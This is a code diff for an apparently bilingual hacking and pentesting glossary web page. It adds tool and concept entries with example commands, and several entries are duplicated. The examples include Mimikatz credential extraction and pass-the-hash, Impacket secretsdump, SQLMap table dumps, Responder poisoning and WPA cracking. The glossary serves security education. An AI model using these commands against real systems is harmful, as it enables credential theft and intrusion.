+    explanation: "It prevents users or processes from having more privileges than needed, reducing the impact of a potential compromise. It is essential to prevent privilege escalation and limit damage in case of attack.",
+    example: `Example:
+- User without admin rights
+- Service that can only access its own database`,
+    importance: "It significantly reduces attack impact and is a core practice in secure environments."
+},
+{
+    title: "OWASP Top 10",
+    slug: "owasp-top-10",
+    category: "Methodologies",
+    tags: ["methodology", "web", "interview"],
+    definition: "List of the most critical and common web vulnerabilities published by OWASP.",
+    explanation: "It serves as a reference for developers and pentesters to identify risks in web applications. It includes categories such as Injection, Broken Access Control, Security Misconfiguration, and XSS.",
+    example: `Examples:
+- Injection (SQLi)
+- Broken Authentication
+- Cross-Site Scripting (XSS)`,
+    importance: "It is an industry standard and a mandatory reference in cybersecurity interviews."
+},
+{
+    title: "Kill Chain",
+    slug: "kill-chain",
+    category: "Methodologies",
+    tags: ["methodology", "interview"],
+    definition: "Model that describes the phases of an attack from reconnaissance to exfiltration.",
+    explanation: "It helps understand how attackers operate step by step. Phases include: reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on objectives.",
+    example: `Phases:
+1. Reconnaissance
+2. Exploitation
+3. Persistence
+4. Lateral Movement
+5. Exfiltration`,
+    importance: "It helps identify the stage of an attack and how to detect or stop it."
+},
+{
+    title: "Backdoor",
+    slug: "backdoor",
+    category: "Malware",
+    tags: ["malware", "persistence", "interview"],
+    definition: "Hidden mechanism that allows persistent access to a system bypassing normal authentication methods.",
+    explanation: "It can be installed by attackers after compromise or exist as a software flaw. It allows continuous access even after reboots or credential changes.",
+    example: `Example:
+Hidden user with administrator privileges`,
+    importance: "It allows attackers to maintain long-term control without being easily detected."
+}, {
+    title: "Subdomain Enumeration",
+    slug: "subdomain-enumeration",
+    category: "Reconnaissance",
+    tags: ["reconnaissance", "web", "osint"],
+    definition: "Discover subdomains associated with a main domain.",
+    explanation: "Subdomains expose internal services, admin panels, staging environments, or unprotected APIs. Techniques include SSL certificates, brute force, DNS, and scraping.",
+    example: `# Subfinder
+subfinder -d example.com -o subdomains.txt
+
+# Certificate Transparency
+curl -s https://crt.sh/?q=%.example.com&output=json
+
+# Gobuster
+gobuster dns -d example.com -w subdomains.txt`,
+    importance: "Many attacks start by discovering forgotten or misconfigured subdomains."
+},
+{
+    title: "Nikto",
+    slug: "nikto",
+    category: "Tools",
+    tags: ["tools", "web", "scanning"],
+    definition: "Open-source web vulnerability scanner.",
+    explanation: "Performs tests against web servers to detect dangerous configurations, outdated files, and software. Checks over 6700 potentially dangerous files/programs.",
+    example: `# Basic scan
+nikto -h http://target.com
+
+# With authentication
+nikto -h http://target.com -id user:pass
+
+# Save results
+nikto -h http://target.com -o report.html`,
+    importance: "Quickly identifies common misconfigurations and outdated web server components."
+},
+{
+    title: "SQLMap",
+    slug: "sqlmap",
+    category: "Tools",
+    tags: ["tools", "web", "database"],
+    definition: "Automatic tool for detecting and exploiting SQL injection vulnerabilities.",
+    explanation: "Automates detection and exploitation of SQL injection vulnerabilities. Supports all major DBMS and injection techniques.",
+    example: `# Basic detection
+sqlmap -u "http://target.com/page?id=1"
+
+# List databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Dump table
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`,
+    importance: "Greatly speeds up finding and exploiting SQL injection vulnerabilities."
+},
+{
+    title: "Gobuster",
+    slug: "gobuster",
+    category: "Tools",
+    tags: ["tools", "web", "reconnaissance"],
+    definition: "Brute-force tool for URIs, DNS, and virtual hosts.",
+    explanation: "Written in Go, extremely fast for discovering hidden directories, files, and subdomains via brute force.",
+    example: `# Directories
+gobuster dir -u http://target.com -w wordlist.txt
+
+# DNS
+gobuster dns -d target.com -w subdomains.txt
+
+# VHosts
+gobuster vhost -u http://target.com -w vhosts.txt`,
+    importance: "Finds hidden resources not publicly linked in web applications."
+},
+{
+    title: "Hashcat",
+    slug: "hashcat",
+    category: "Tools",
+    tags: ["tools", "cracking", "password"],
+    definition: "Advanced password cracking tool with GPU support.",
+    explanation: "Supports over 300 hash algorithms. Uses GPUs for massive speedup. Considered the fastest password cracking tool.",
+    example: `# MD5 dictionary attack
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+
+# NTLM with rules
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r best64.rule
+
+# WPA handshake
+hashcat -m 22000 capture.hc22000 wordlist.txt`,
+    importance: "Uses GPU power to crack hashes extremely fast."
+},
+{
+    title: "Responder",
+    slug: "responder",
+    category: "Tools",
+    tags: ["tools", "networks", "credentials"],
+    definition: "Tool for LLMNR, NBT-NS, and MDNS poisoning.",
+    explanation: "Intercepts name resolution requests in local networks to capture credentials hashes by spoofing responses.",
+    example: `# Basic mode
+responder -I eth0
+
+# Analysis mode
+responder -I eth0 -A
+
+# WPAD attack
+responder -I eth0 -w`,
+    importance: "Captures NTLM hashes or clear credentials in Windows networks silently."
+},
+{
+    title: "Mimikatz",
+    slug: "mimikatz",
+    category: "Tools",
+    tags: ["tools", "windows", "credentials"],
+    definition: "Tool for extracting credentials from memory in Windows systems.",
+    explanation: "Extracts plaintext passwords, hashes, PINs, and Kerberos tickets from memory. Essential for Windows post-exploitation.",
+    example: `# Extract credentials
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+
+# Kerberos tickets
+mimikatz.exe "sekurlsa::tickets"
+
+# Pass-the-Hash
+mimikatz.exe "sekurlsa::pth /user:admin /ntlm:<hash>"`,
+    importance: "Key tool for lateral movement in Active Directory environments."
+},
+{
+    title: "CrackMapExec",
+    slug: "crackmapexec",
+    category: "Tools",
+    tags: ["tools", "networks", "windows"],
+    definition: "Swiss army knife for Windows network pentesting.",
+    explanation: "Automates security assessment of large Active Directory networks. Supports SMB, WinRM, MSSQL, LDAP, SSH.",
+    example: `# SMB scan
+crackmapexec smb 192.168.1.0/24
+
+# Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u admin -H <hash>
+
+# Execute command
+crackmapexec smb 192.168.1.10 -u admin -p pass -x "whoami"`,
+    importance: "Allows rapid assessment of Windows network security."
+},
+{
+    title: "BloodHound",
+    slug: "bloodhound",
+    category: "Tools",
+    tags: ["tools", "windows", "active-directory"],
+    definition: "Tool for mapping relationships in Active Directory.",
+    explanation: "Uses graph theory to reveal hidden relationships in AD and identify complex attack paths.",
+    example: `# Collect data
+SharpHound.exe -c All
+
+# Import data
+Upload .zip into BloodHound
+
+# Query
+MATCH p=shortestPath((u:User)-[*1..]->(c:Computer)) RETURN p`,
+    importance: "Reveals privilege escalation paths in Active Directory."
+},
+{
+    title: "Impacket",
+    slug: "impacket",
+    category: "Tools",
+    tags: ["tools", "windows", "networks"],
+    definition: "Python library collection for working with network protocols.",
+    explanation: "Provides programmatic access to SMB, Kerberos, LDAP, and MSRPC protocols. Includes many pentesting scripts.",
+    example: `# PsExec
+psexec.py DOMAIN/user:pass@192.168.1.10
+
+# Dump credentials
+secretsdump.py DOMAIN/user:pass@192.168.1.10
+
+# Kerberos attack
+GetNPUsers.py DOMAIN/ -usersfile users.txt`,
+    importance: "Essential toolkit for Windows network pentesting."
+},
+{
+    title: "Nessus",
+    slug: "nessus",
+    category: "Tools",
+    tags: ["tools", "scanning", "vulnerabilities"],
+    definition: "Commercial vulnerability scanner widely used in industry.",
+    explanation: "Detects vulnerabilities, malware, and misconfigurations. Continuously updated vulnerability database.",
+    example: `# Basic scan (GUI)
+1. Create scan policy
+2. Set targets
+3. Run scan
+4. Review results`,
+    importance: "Industry standard for enterprise vulnerability scanning."
+},
+{
+    title: "OpenVAS",
+    slug: "openvas",
+    category: "Tools",
+    tags: ["tools", "scanning", "vulnerabilities"],
+    definition: "Open-source vulnerability scanning framework.",
+    explanation: "Free alternative to Nessus. Includes over 50,000 vulnerability tests (NVTs).",
+    example: `# Start services
+gvm-start
+
+# Web UI
+https://localhost:9392
+
+# Create scan target`,
+    importance: "Full free solution for vulnerability scanning."
+},
+{
+    title: "Aircrack-ng",
+    slug: "aircrack-ng",
+    category: "Tools",
+    tags: ["tools", "wireless", "cracking"],
+    definition: "Suite of tools for WiFi security auditing.",
+    explanation: "Captures packets, analyzes wireless traffic, and cracks WEP/WPA/WPA2 keys.",
+    example: `# Monitor mode
+airmon-ng start wlan0
+
+# Capture handshake
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+
+# Crack WPA
+aircrack-ng -w wordlist.txt capture.cap`,
+    importance: "Standard tool for WiFi penetration testing."
+},
+{
+    title: "Recon-ng",
+    slug: "recon-ng",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Web reconnaissance framework with modular interface.",
+    explanation: "Automates OSINT gathering with modules and integrated database.",
+    example: `# Install modules
+marketplace install all
+
+# Load module
+modules load recon/domains-hosts/google_site_web
+run
+
+# Show results
+show hosts`,
+    importance: "Centralizes passive reconnaissance workflow."
+},
+{
+    title: "TheHarvester",
+    slug: "theharvester",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Tool for gathering information from public sources.",
+    explanation: "Collects emails, subdomains, hosts, employees, and open ports from public sources.",
+    example: `# All sources
+theHarvester -d example.com -b all
+
+# Specific source
+theHarvester -d example.com -b google
+
+# Limit results
+theHarvester -d example.com -b bing -l 200`,
+    importance: "Fast initial information gathering tool."
+},
+{
+    title: "Shodan",
+    slug: "shodan",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "iot"],
+    definition: "Search engine for internet-connected devices.",
+    explanation: "Indexes service banners like webcams, routers, servers, and IoT devices.",
+    example: `# Web search
+https://shodan.io
+
+# CLI
+shodan search apache
+
+# Filters
+shodan search "port:22 country:ES"`,
+    importance: "Finds exposed and misconfigured devices on the internet."
+},
+{
+    title: "Maltego",
+    slug: "maltego",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Graph-based intelligence and forensics platform.",
+    explanation: "Visualizes relationships between domains, people, IPs, and organizations.",
+    example: `# Workflow
+1. Create graph
+2. Add entity
+3. Run transforms
+4. Analyze relationships`,
+    importance: "Visualizes complex relationships in OSINT investigations."
+},
+{
+    title: "Censys",
+    slug: "censys",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "certificates"],
+    definition: "Search engine for SSL certificates and hosts.",
+    explanation: "Continuously scans internet infrastructure and certificates.",
+    example: `# Web search
+https://search.censys.io
+
+# Organization search
+parsed.names: "Example Inc"`,
+    importance: "Discovers infrastructure tied to a target."
+},
+{
+    title: "Amass",
+    slug: "amass",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "subdomains"],
+    definition: "Attack surface mapping tool.",
+    explanation: "Uses DNS, scraping, APIs, and certificates to enumerate subdomains.",
+    example: `# Passive enumeration
+amass enum -passive -d example.com
+
+# Active
+amass enum -d example.com`,
+    importance: "One of the most powerful subdomain enumeration tools."
+},
+{
+    title: "Feroxbuster",
+    slug: "feroxbuster",
+    category: "Tools",
+    tags: ["tools", "web", "fuzzing"],
+    definition: "Fast web content discovery tool written in Rust.",
+    explanation: "Finds hidden directories and files recursively at high speed.",
+    example: `# Basic scan
+feroxbuster -u http://target.com -w wordlist.txt
+
+# Extensions
+feroxbuster -u http://target.com -w wordlist.txt -x php,html,js`,
+    importance: "Very fast recursive web directory discovery tool."
+},
+{
+    title: "Subdomain Enumeration",
+    slug: "subdomain-enumeration",
+    category: "Reconnaissance",
+    tags: ["reconnaissance", "web", "osint"],
+    definition: "Discover subdomains associated with a main domain.",
+    explanation: "Subdomains expose internal services, admin panels, staging or unprotected APIs. Techniques: SSL certificates, brute force, DNS, scraping.",
+    example: `# Subfinder
+subfinder -d example.com -o subdomains.txt
+
+# Certificate Transparency
+curl -s https://crt.sh/?q=%.example.com&output=json
+
+# Gobuster
+gobuster dns -d example.com -w subdomains.txt`,
+    importance: "Many attacks start by discovering forgotten or misconfigured subdomains."
+},
+{
+    title: "Nikto",
+    slug: "nikto",
+    category: "Tools",
+    tags: ["tools", "web", "scanning"],
+    definition: "Open source web vulnerability scanner.",
+    explanation: "Performs tests against web servers to detect dangerous configurations, files and outdated software. Checks more than 6700 potentially dangerous files/programs.",
+    example: `# Basic scan
+nikto -h http://target.com
+
+# With authentication
+nikto -h http://target.com -id user:pass
+
+# Save results
+nikto -h http://target.com -o report.html`,
+    importance: "Quickly identifies common configuration issues and outdated server software."
+},
+{
+    title: "SQLMap",
+    slug: "sqlmap",
+    category: "Tools",
+    tags: ["tools", "web", "database"],
+    definition: "Automatic tool for detecting and exploiting SQL injection vulnerabilities.",
+    explanation: "Automates detection and exploitation of SQL injection vulnerabilities. Supports all major DBMS and injection techniques.",
+    example: `# Basic detection
+sqlmap -u "http://target.com/page?id=1"
+
+# Extract databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Dump table
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`,
+    importance: "Drastically speeds up finding and exploiting SQL injection vulnerabilities."
+},
+{
+    title: "Gobuster",
+    slug: "gobuster",
+    category: "Tools",
+    tags: ["tools", "web", "reconnaissance"],
+    definition: "Brute force tool for URIs, DNS and file names.",
+    explanation: "Written in Go, extremely fast for discovering hidden directories, files and subdomains via brute force.",
+    example: `# Directories
+gobuster dir -u http://target.com -w wordlist.txt
+
+# DNS
+gobuster dns -d target.com -w subdomains.txt
+
+# VHosts
+gobuster vhost -u http://target.com -w vhosts.txt`,
+    importance: "Finds hidden resources not publicly linked in web applications."
+},
+{
+    title: "Hashcat",
+    slug: "hashcat",
+    category: "Tools",
+    tags: ["tools", "cracking", "password"],
+    definition: "Advanced password cracker with GPU support.",
+    explanation: "Supports more than 300 hash algorithms. Uses GPU to massively accelerate cracking. Considered the fastest tool of its kind.",
+    example: `# MD5 with dictionary
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+
+# NTLM with rules
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r best64.rule
+
+# WPA handshake
+hashcat -m 22000 capture.hc22000 wordlist.txt`,
+    importance: "Uses GPU power to crack hashes in a fraction of CPU time."
+},
+{
+    title: "Responder",
+    slug: "responder",
+    category: "Tools",
+    tags: ["tools", "network", "credentials"],
+    definition: "Tool for LLMNR, NBT-NS and MDNS poisoning.",
+    explanation: "Intercepts name resolution requests in local networks to capture credential hashes. Works by responding to network broadcasts.",
+    example: `# Basic mode
+responder -I eth0
+
+# Analysis mode (no response)
+responder -I eth0 -A
+
+# With WPAD
+responder -I eth0 -w`,
+    importance: "Captures plaintext credentials or NT hashes in Windows networks without raising alarms."
+},
+{
+    title: "Mimikatz",
+    slug: "mimikatz",
+    category: "Tools",
+    tags: ["tools", "windows", "credentials"],
+    definition: "Tool to extract credentials from memory in Windows.",
+    explanation: "Can extract plaintext passwords, hashes, PINs and Kerberos tickets from memory. Essential for Windows post-exploitation.",
+    example: `# Extract credentials
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+
+# Extract Kerberos tickets
+mimikatz.exe "sekurlsa::tickets"
+
+# Pass-the-Hash
+mimikatz.exe "sekurlsa::pth /user:admin /ntlm:<hash>"`,
+    importance: "Essential tool for lateral movement in Windows Active Directory environments."
+},
+{
+    title: "CrackMapExec",
+    slug: "crackmapexec",
+    category: "Tools",
+    tags: ["tools", "network", "windows"],
+    definition: "Swiss army knife for Windows network pentesting.",
+    explanation: "Automates security assessment of large Active Directory networks. Supports SMB, WinRM, MSSQL, LDAP, SSH.",
+    example: `# SMB scan
+crackmapexec smb 192.168.1.0/24
+
+# Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u admin -H <hash>
+
+# Execute command
+crackmapexec smb 192.168.1.10 -u admin -p pass -x "whoami"`,
+    importance: "Quickly evaluates the security of an entire Windows network."
+},
+{
+    title: "BloodHound",
+    slug: "bloodhound",
+    category: "Tools",
+    tags: ["tools", "windows", "active-directory"],
+    definition: "Tool for mapping relationships in Active Directory.",
+    explanation: "Uses graph theory to reveal hidden relationships in AD. Identifies complex attack paths impossible to see manually.",
+    example: `# Collect data (SharpHound)
+SharpHound.exe -c All
+
+# Import into BloodHound
+# Upload .zip file to BloodHound GUI
+
+# Query example
+MATCH p=shortestPath((u:User)-[*1..]->(c:Computer)) RETURN p`,
+    importance: "Reveals privilege escalation paths in AD environments."
+},
+{
+    title: "Impacket",
+    slug: "impacket",
+    category: "Tools",
+    tags: ["tools", "windows", "network"],
+    definition: "Collection of Python classes for working with network protocols.",
+    explanation: "Provides programmatic access to Windows protocols: SMB, MSRPC, LDAP, Kerberos. Includes pentesting scripts.",
+    example: `# PsExec
+psexec.py DOMAIN/user:pass@192.168.1.10
+
+# SecretsDump
+secretsdump.py DOMAIN/user:pass@192.168.1.10
+
+# GetNPUsers (ASREPRoast)
+GetNPUsers.py DOMAIN/ -usersfile users.txt`,
+    importance: "Essential toolkit for Windows network pentesting without Windows tools."
+},
+{
+    title: "Nessus",
+    slug: "nessus",
+    category: "Tools",
+    tags: ["tools", "scanning", "vulnerabilities"],
+    definition: "Widely used commercial vulnerability scanner.",
+    explanation: "Identifies vulnerabilities, malware and misconfigurations. Constantly updated vulnerability database.",
+    example: `# Basic scan via GUI
+1. Create new scan policy
+2. Configure targets
+3. Run scan
+4. Review results by severity`,
+    importance: "Industry standard for vulnerability assessments in corporate environments."
+},
+{
+    title: "OpenVAS",
+    slug: "openvas",
+    category: "Tools",
+    tags: ["tools", "scanning", "vulnerabilities"],
+    definition: "Open source vulnerability scanning framework.",
+    explanation: "Free alternative to Nessus. Includes more than 50,000 vulnerability tests (NVTs). Constantly updated database.",
+    example: `# Start services
+gvm-start
+
+# Access web UI
+https://localhost:9392
+
+# Create target and scan`,
+    importance: "Complete free solution for vulnerability scanning."
+},
+{
+    title: "Aircrack-ng",
+    slug: "aircrack-ng",
+    category: "Tools",
+    tags: ["tools", "wireless", "cracking"],
+    definition: "Suite of tools for WiFi security auditing.",
+    explanation: "Captures packets, analyzes wireless traffic and cracks WEP/WPA/WPA2 keys. Complete suite: airodump, aireplay, aircrack.",
+    example: `# Monitor mode
+airmon-ng start wlan0
+
+# Capture handshake
+airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+
+# Crack WPA
+aircrack-ng -w wordlist.txt capture.cap`,
+    importance: "Standard for wireless security audits and WiFi penetration testing."
+},
+{
+    title: "Recon-ng",
+    slug: "recon-ng",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Web reconnaissance framework with modular interface.",
+    explanation: "Automates OSINT with modules for different sources. Metasploit-like interface. Built-in database to store results.",
+    example: `# Install modules
+marketplace install all
+
+# Load module
+modules load recon/domains-hosts/google_site_web
+run
+
+# View results
+show hosts`,
+    importance: "Centralizes and automates passive reconnaissance phase."
+},
+{
+    title: "TheHarvester",
+    slug: "theharvester",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Tool for gathering information from public sources.",
+    explanation: "Collects emails, subdomains, hosts, employee names, open ports and banners from public sources.",
+    example: `# Search all sources
+theHarvester -d example.com -b all
+
+# Specific source
+theHarvester -d example.com -b google
+
+# Limit results
+theHarvester -d example.com -b bing -l 200`,
+    importance: "Fast initial information gathering about a target."
+},
+{
+    title: "Shodan",
+    slug: "shodan",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "iot"],
+    definition: "Search engine for internet-connected devices.",
+    explanation: "Indexes service banners: webcams, routers, servers, IoT devices. Allows searching vulnerable devices by technology, country, organization.",
+    example: `# Web search
+https://shodan.io
+
+# CLI
+shodan search apache
+
+# Filters
+shodan search "port:22 country:ES"`,
+    importance: "Identifies exposed and misconfigured devices on the Internet."
+},
+{
+    title: "Maltego",
+    slug: "maltego",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "osint"],
+    definition: "Graph-based intelligence and forensics platform.",
+    explanation: "Visualizes relationships between people, companies, domains, IPs. Uses transformations to discover connections automatically.",
+    example: `# Typical workflow
+1. Create new graph
+2. Add entity (domain, person, IP)
+3. Run transformations
+4. Analyze discovered relationships`,
+    importance: "Visualizes complex relationships difficult to see in text form."
+},
+{
+    title: "Censys",
+    slug: "censys",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "certificates"],
+    definition: "Search engine for SSL certificates and hosts.",
+    explanation: "Continuously scans the Internet indexing hosts and certificates. Useful for discovering infrastructure related to a target.",
+    example: `# Web search
+https://search.censys.io
+
+# By organization
+parsed.names: "Example Inc"
+
+# By domain in certificate
+parsed.subject_dn: "example.com"`,
+    importance: "Discovers infrastructure and certificates related to a target."
+},
+{
+    title: "Amass",
+    slug: "amass",
+    category: "Tools",
+    tags: ["tools", "reconnaissance", "subdomains"],
+    definition: "Attack surface enumeration tool.",
+    explanation: "Uses web scraping, APIs, DNS zone transfers, certificates, recursive searches to map subdomains and related assets.",
+    example: `# Passive enumeration
+amass enum -passive -d example.com
+
+# Active enumeration
+amass enum -d example.com
+
+# All sources
+amass enum -d example.com -src`,
+    importance: "One of the most complete tools for subdomain discovery."
+},
+{
+    title: "Feroxbuster",
+    slug: "feroxbuster",
+    category: "Tools",
+    tags: ["tools", "web", "fuzzing"],
+    definition: "Fast web content fuzzer written in Rust.",
+    explanation: "Discovers hidden directories and files. Extremely fast, recursive by default, smart filtering.",
+    example: `# Basic scan
+feroxbuster -u http://target.com -w wordlist.txt
+
+# Recursive with extensions
+feroxbuster -u http://target.com -w wordlist.txt -x php,html,js
+
+# Filter by code
+feroxbuster -u http://target.com -w wordlist.txt -C 404`,
+    importance: "Discovers hidden resources very quickly thanks to Rust performance."
+},
+{
+    title: "FFUF",
+    slug: "ffuf",
+    category: "Tools",
+    tags: ["tools", "web", "fuzzing"],
+    definition: "Fast web fuzzer written in Go.",
+    explanation: "Fuzzing of directories, files, parameters, subdomains, vhosts. Extremely versatile and fast.",
+    example: `# Directories
+ffuf -u http://target.com/FUZZ -w wordlist.txt
+
+# Subdomains
+ffuf -u http://FUZZ.target.com -w subdomains.txt
+
+# GET parameters
+ffuf -u http://target.com/page?FUZZ=test -w params.txt`,
+    importance: "Extremely versatile and fast fuzzing tool."
+},
+{
+    title: "Nuclei",
+    slug: "nuclei",
+    category: "Tools",
+    tags: ["tools", "web", "scanning"],
+    definition: "Template-based vulnerability scanner.",
+    explanation: "Uses YAML templates to detect vulnerabilities. Active community creating templates. Constantly updated signatures.",
+    example: `# Basic scan
+nuclei -u https://target.com
+
+# With specific templates
+nuclei -u https://target.com -t cves/
+
+# URL list
+nuclei -l urls.txt`,
+    importance: "Quickly detects known vulnerabilities using community templates."
+},
+{
+    title: "Masscan",
+    slug: "masscan",
+    category: "Tools",
+    tags: ["tools", "network", "scanning"],
+    definition: "Extremely fast TCP port scanner.",
+    explanation: "Capable of scanning the entire Internet in under 6 minutes. Similar to Nmap but much faster for mass scanning.",
+    example: `# Fast scan
+masscan 192.168.1.0/24 -p80,443,8080 --rate=10000
+
+# All ports
+masscan 192.168.1.0/24 -p0-65535 --rate=10000
+
+# Save results
+masscan 192.168.1.0/24 -p80 -oL output.txt`,
+    importance: "Mass-scale port scanning in record time."
+},
+{
+    title: "Enum4linux",
+    slug: "enum4linux",
+    category: "Tools",
+    tags: ["tools", "windows", "enumeration"],
+    definition: "Tool for enumerating information from Windows systems.",
+    explanation: "Extracts information from Windows/Samba systems via SMB. Lists users, shares, policies, groups, SIDs.",
+    example: `# Full enumeration
+enum4linux -a 192.168.1.10
+
+# Users only
+enum4linux -U 192.168.1.10
+
+# Shares only
+enum4linux -S 192.168.1.10`,
+    importance: "Extracts valuable information from Windows systems for reconnaissance."
+},
+{
+    title: "OWASP ZAP",
+    slug: "owasp-zap",
+    category: "Tools",
+    tags: ["tools", "web", "proxy"],
+    definition: "Zed Attack Proxy - Open source web security tool.",
+    explanation: "Free alternative to Burp Suite. Includes proxy, spider, active/passive scanner, fuzzer. Maintained by OWASP.",
+    example: `# CI/CD daemon mode
+zap.sh -daemon -port 8080
+
+# Automated scan
+zap-cli quick-scan -s xss,sqli http://target.com
+
+# Spider + scan
+zap-cli spider http://target.com
+zap-cli active-scan http://target.com`,
+    importance: "Free complete web security suite, ideal for CI/CD integration."
+}
+
+            ]
+        };
+
+        let currentLang = 'es';
+        let terms = termsData.es;
+        let selectedTags = new Set();
+        let searchQuery = '';
+
+        const translations = {
+            es: {
+                tagline: 'El diccionario definitivo para hackers y pentesters',
+                searchPlaceholder: 'Buscar términos, técnicas, herramientas...',
+                filterText: 'Filtros',
+                categoriesText: 'Categorías',
+                noResultsTitle: 'No se encontraron resultados',
+                noResultsText: 'Intenta ajustar tu búsqueda o filtros',
+                definitionLabel: 'Definición',
+                explanationLabel: 'Explicación',
+                exampleLabel: 'Ejemplo',
+                importanceLabel: '¿Por qué importa?'
+            },
+            en: {
+                tagline: 'The definitive dictionary for hackers and pentesters',
+                searchPlaceholder: 'Search terms, techniques, tools...',
+                filterText: 'Filters',
+                categoriesText: 'Categories',
+                noResultsTitle: 'No results found',
+                noResultsText: 'Try adjusting your search or filters',
+                definitionLabel: 'Definition',
+                explanationLabel: 'Explanation',
+                exampleLabel: 'Example',
+                importanceLabel: 'Why it matters?'
+            }
+        };
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            terms = termsData[lang];
+            
+            document.getElementById('langEs').classList.toggle('active', lang === 'es');
+            document.getElementById('langEn').classList.toggle('active', lang === 'en');
+            
+            document.getElementById('tagline').textContent = translations[lang].tagline;
+            document.getElementById('searchInput').placeholder = translations[lang].searchPlaceholder;
+            document.getElementById('filterText').textContent = translations[lang].filterText;
+            document.getElementById('categoriesText').textContent = translations[lang].categoriesText;
+            
+            selectedTags.clear();
+            searchQuery = '';
+            document.getElementById('searchInput').value = '';
+            
+            initializeTagsDropdown();
+            renderContent();
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeTagsDropdown();
+            renderContent();
+            
+            document.getElementById('searchInput').addEventListener('input', (e) => {
+                searchQuery = e.target.value.toLowerCase();
+                renderContent();
+            });
+
+            document.getElementById('filterBtn').addEventListener('click', toggleFilterDropdown);
+
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('#filterBtn') && !e.target.closest('#filterDropdown')) {
+                    document.getElementById('filterDropdown').classList.remove('active');
+                }
+            });
+        });
+
+        function initializeTagsDropdown() {
+            const allTags = new Set();
+            terms.forEach(term => term.tags.forEach(tag => allTags.add(tag)));
+            
+            const tagsGrid = document.getElementById('tagsGrid');
+            tagsGrid.innerHTML = '';
+            [...allTags].sort().forEach(tag => {
+                const tagEl = document.createElement('div');
+                tagEl.className = 'tag-option';
+                tagEl.textContent = `#${tag}`;
+                tagEl.onclick = () => toggleTag(tag, tagEl);
+                tagsGrid.appendChild(tagEl);
+            });
+        }
+
+        function toggleFilterDropdown() {
+            const dropdown = document.getElementById('filterDropdown');
+            const btn = document.getElementById('filterBtn');
+            dropdown.classList.toggle('active');
+            btn.classList.toggle('active');
+        }
+
+        function toggleTag(tag, element) {
+            if (selectedTags.has(tag)) {
+                selectedTags.delete(tag);
+                element.classList.remove('selected');
+            } else {
+                selectedTags.add(tag);
+                element.classList.add('selected');
+            }
+            updateFilterCount();
+            renderContent();
+        }
+
+        function updateFilterCount() {
+            const count = document.getElementById('filterCount');
+            if (selectedTags.size > 0) {
+                count.textContent = selectedTags.size;
+                count.style.display = 'block';
+            } else {
+                count.style.display = 'none';
+            }
+        }
+
+        function getFilteredTerms() {
+            return terms.filter(term => {
+                if (searchQuery) {
+                    const matches = 
+                        term.title.toLowerCase().includes(searchQuery) ||
+                        term.definition.toLowerCase().includes(searchQuery) ||
+                        term.explanation.toLowerCase().includes(searchQuery) ||
+                        term.tags.some(tag => tag.toLowerCase().includes(searchQuery));
+                    if (!matches) return false;
+                }
+                
+                if (selectedTags.size > 0) {
+                    const hasAllTags = [...selectedTags].every(tag => term.tags.includes(tag));
+                    if (!hasAllTags) return false;
+                }
+                
+                return true;
+            });
+        }
+
+        function renderContent() {
+            const filtered = getFilteredTerms();
+            const container = document.getElementById('contentContainer');
+            
+            if (filtered.length === 0) {
+                container.innerHTML = `
+                    <div class="no-results">
+                        <div class="no-results-icon">🔍</div>
+                        <h3>${translations[currentLang].noResultsTitle}</h3>
+                        <p>${translations[currentLang].noResultsText}</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const grouped = {};
+            filtered.forEach(term => {
+                const firstChar = term.title[0].toUpperCase();
+                const key = /[0-9]/.test(firstChar) ? '0-9' : firstChar;
+                if (!grouped[key]) grouped[key] = [];
+                grouped[key].push(term);
+            });
+
+            const sortedKeys = Object.keys(grouped).sort((a, b) => {
+                if (a === '0-9') return -1;
+                if (b === '0-9') return 1;
+                return a.localeCompare(b);
+            });
+
+            container.innerHTML = sortedKeys.map(letter => `
+                <div class="letter-group">
+                    <div class="letter-header">${letter}</div>
+                    <div class="terms-grid">
+                        ${grouped[letter].map(term => renderTermCard(term)).join('')}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function renderTermCard(term) {
+            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
+            return `
+                <div class="term-card" onclick="openModal('${term.slug}')">
+                    <div class="term-header">
+                        <div class="term-title">${term.title}</div>
+                        <div class="term-category-badge ${categoryClass}">${term.category}</div>
+                    </div>
+                    <div class="term-definition">${term.definition}</div>
+                    <div class="term-tags">
+                        ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
+                    </div>
+                </div>
+            `;
+        }
+
+        function openModal(slug) {
+            const term = terms.find(t => t.slug === slug);
+            if (!term) return;
+            
+            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
+            const modal = document.getElementById('termModal');
+            const modalBody = document.getElementById('modalBody');
+            
+            const escapedExample = term.example
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
